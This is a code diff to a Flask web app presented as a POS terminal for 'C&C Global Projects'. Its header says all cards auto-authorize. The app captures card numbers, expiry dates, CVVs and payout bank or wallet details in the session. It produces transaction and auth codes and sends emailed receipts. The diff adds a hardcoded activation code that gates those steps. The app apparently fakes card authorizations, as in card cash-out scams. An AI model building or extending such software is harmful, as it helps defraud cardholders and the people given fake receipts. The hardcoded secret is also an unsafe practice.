@@ -1,4 +1,4 @@
-# app.py - C&C Global PROJECTS POS (all cards auto-authorize)
+# app.py - C&C Global Projects POS (all cards auto-authorize)
 from flask import Flask, render_template, request, redirect, session, url_for, send_file, flash, jsonify
 from flask_mail import Mail, Message
 import random, logging, os, hashlib, json, re, tempfile, threading
@@ -39,7 +39,7 @@ app.config['MAIL_PASSWORD'] = os.environ.get('MAIL_PASSWORD', '')
 app.config['MAIL_DEFAULT_SENDER'] = os.environ.get('MAIL_DEFAULT_SENDER', 'support@ccglobalprojects.com')
 mail = Mail(app)
 
-TERMINAL_COMPANY_NAME = "C&C Global PROJECTS"
+TERMINAL_COMPANY_NAME = "C&C Global Projects"
 # Footer on receipt emails (plain text + HTML)
 TERMINAL_MAIL_ADDRESS_LINE = "P O BOX 504214, Gaborone, Botswana"
 TERMINAL_MAIL_CONTACT = "+14145126049"
@@ -521,6 +521,15 @@ def login_required(f):
     return decorated
 
 
+def _require_activation_after_card():
+    """After card capture, require activation key before auth / decrypting / processing."""
+    if not session.get("pan"):
+        return redirect(url_for("card"))
+    if session.get("activation_unlocked"):
+        return None
+    return redirect(url_for("activation_lock"))
+
+
 def require_terminal_unlock(area):
     """Staff login + terminal code for this area only (Settings and Reports each ask once per session)."""
     session_key = f"terminal_unlock_{area}"
@@ -556,6 +565,10 @@ OFFLINE_PROTOCOLS = {
 }
 PROTOCOLS = {**ONLINE_PROTOCOLS, **OFFLINE_PROTOCOLS}
 
+# Post–card: 8-digit activation before authorization / processing chain
+ACTIVATION_LOCK_CODE = "20266202"
+
+
 def _clear_sale_session():
     """Reset in-progress sale data (keep login)."""
     for key in (
@@ -563,7 +576,7 @@ def _clear_sale_session():
         'amount', 'payout_category', 'payout_type', 'wallet', 'bank_name', 'bank_account_holder',
         'bank_account_number', 'bank_swift', 'bank_iban_routing', 'pan', 'exp', 'cvv', 'card_type', 'email',
         'txn_id', 'arn', 'timestamp', 'field39', 'auth_code',
-        '_txn_history_logged',
+        '_txn_history_logged', 'activation_unlocked',
     ):
         session.pop(key, None)
 
@@ -945,6 +958,7 @@ def card():
 
         # All server-side validations passed -> store values and continue
         # NOTE: Avoid logging sensitive values (do not log CVV).
+        session.pop("activation_unlocked", None)
         session.update({
             'pan': pan_digits,
             'exp': expiry_clean,
@@ -953,14 +967,36 @@ def card():
             'email': email
         })
 
-        # If pinless, jump straight to decrypting screen
-        if session.get("pinless"):
-            return redirect(url_for('decrypting'))
-
-        return redirect(url_for('auth'))
+        return redirect(url_for("activation_lock"))
 
     # GET handler
     return render_template('card.html', offline_no_cvv=offline)
+
+
+@app.route("/activation-lock", methods=["GET", "POST"])
+@login_required
+def activation_lock():
+    """8-digit activation after card; required before auth or decrypting."""
+    redir = _require_protocol_selected()
+    if redir:
+        return redir
+    if not session.get("pan"):
+        flash("Enter card details first.")
+        return redirect(url_for("card"))
+    if request.method == "POST":
+        key = re.sub(r"\D", "", (request.form.get("activation_key") or ""))
+        if key == ACTIVATION_LOCK_CODE:
+            session["activation_unlocked"] = True
+            if session.get("pinless"):
+                return redirect(url_for("decrypting"))
+            return redirect(url_for("auth"))
+        flash("Invalid activation key.")
+        return redirect(url_for("activation_lock"))
+    if session.get("activation_unlocked"):
+        if session.get("pinless"):
+            return redirect(url_for("decrypting"))
+        return redirect(url_for("auth"))
+    return render_template("activation_lock.html")
 
 
 @app.route('/decrypting')
@@ -969,6 +1005,9 @@ def decrypting():
     redir = _require_protocol_selected()
     if redir:
         return redir
+    redir_act = _require_activation_after_card()
+    if redir_act:
+        return redir_act
     # Pinless (101.8): set transaction details here so flow can proceed to processing -> success like other protocols
     if not session.get('txn_id'):
         code_length = session.get('code_length', 4)
@@ -987,6 +1026,9 @@ def auth():
     redir = _require_protocol_selected()
     if redir:
         return redir
+    redir_act = _require_activation_after_card()
+    if redir_act:
+        return redir_act
     expected_length = session.get('code_length', 6)
 
     if request.method == 'POST':
@@ -1021,6 +1063,9 @@ def processing():
     redir = _require_protocol_selected()
     if redir:
         return redir
+    redir_act = _require_activation_after_card()
+    if redir_act:
+        return redir_act
     offline = session.get('offline', False)
     return render_template('processing.html', offline=offline)
 
@@ -1030,6 +1075,9 @@ def success():
     redir = _require_protocol_selected()
     if redir:
         return redir
+    redir_act = _require_activation_after_card()
+    if redir_act:
+        return redir_act
 
     raw_amount = session.get("amount", "0")
     try:
@@ -1155,6 +1203,8 @@ def success():
 
 @app.route("/receipt")
 def receipt():
+    if session.get("pan") and not session.get("activation_unlocked"):
+        return redirect(url_for("activation_lock"))
     raw_protocol = session.get("protocol", "")
     match = re.search(r"-(\d+\.\d+)\s+\((\d+)-digit", raw_protocol)
     if match:
@@ -1218,6 +1268,9 @@ def receipt():
 @login_required
 def receipt_print():
     """Printable version of receipt that triggers browser print"""
+    redir_act = _require_activation_after_card()
+    if redir_act:
+        return redir_act
     if session.get("offline"):
         server_id = "OFFLINE"
     else:
@@ -1249,6 +1302,8 @@ def receipt_print():
 @app.route('/send-receipt-email', methods=['POST'])
 def send_receipt_email():
     """Send receipt via email with PDF attachment - using screenshot for accurate rendering"""
+    if (session.get("pan") or session.get("txn_id")) and not session.get("activation_unlocked"):
+        return jsonify({"success": False, "error": "Session not authorized"}), 403
     recipient_email = request.form.get('email', '').strip()
     
     # Validate email format
